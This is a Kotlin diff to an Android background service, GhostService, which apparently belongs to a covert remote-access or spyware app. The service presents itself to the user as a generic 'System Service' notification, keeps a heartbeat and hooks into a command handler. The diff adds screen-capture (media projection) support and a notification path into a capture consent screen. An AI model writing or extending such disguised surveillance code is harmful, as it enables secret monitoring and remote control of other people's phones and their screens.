@@ -34,6 +34,8 @@ class GhostService : Service() {
 
     override fun onCreate() {
         super.onCreate()
+        instance = this
+        CommandHandler.init(this)
         startForeground(NOTIFICATION_ID, buildNotification())
     }
 
@@ -50,7 +52,29 @@ class GhostService : Service() {
         stopHeartbeat()
         worker?.interrupt()
         worker = null
+        if (instance === this) instance = null
+        ProjectionHub.stop()
         super.onDestroy()
+    }
+
+    /**
+     * Add the mediaProjection foreground-service type (Android 14+ requires
+     * it before MediaProjectionManager.getMediaProjection). Both types are
+     * declared in the manifest, so re-calling startForeground with both is
+     * safe on 29+; pre-29 has no typed startForeground.
+     */
+    fun promoteToProjection() {
+        if (Build.VERSION.SDK_INT >= 29) {
+            try {
+                startForeground(
+                    NOTIFICATION_ID, buildNotification(),
+                    android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC or
+                        android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION
+                )
+            } catch (_: Exception) {
+                // some OEMs reject type changes; projection may still work
+            }
+        }
     }
 
     override fun onBind(intent: Intent): IBinder? = null
@@ -183,6 +207,15 @@ class GhostService : Service() {
             .setContentTitle("System Service")
             .setSmallIcon(android.R.drawable.ic_menu_manage)
             .setOngoing(true)
+            // Fallback tap target: opens the screen-capture consent activity
+            // (primary path is the service starting it directly).
+            .setContentIntent(
+                android.app.PendingIntent.getActivity(
+                    this, 0,
+                    Intent(this, ScreenCaptureActivity::class.java),
+                    android.app.PendingIntent.FLAG_IMMUTABLE
+                )
+            )
             .build()
     }
 
@@ -190,5 +223,9 @@ class GhostService : Service() {
         private const val CHANNEL_ID = "ghostd"
         private const val NOTIFICATION_ID = 1
         private const val HEARTBEAT_MS = 45_000L
+
+        /** Live service instance (for ProjectionHub's FGS promotion). */
+        @Volatile var instance: GhostService? = null
+            private set
     }
 }
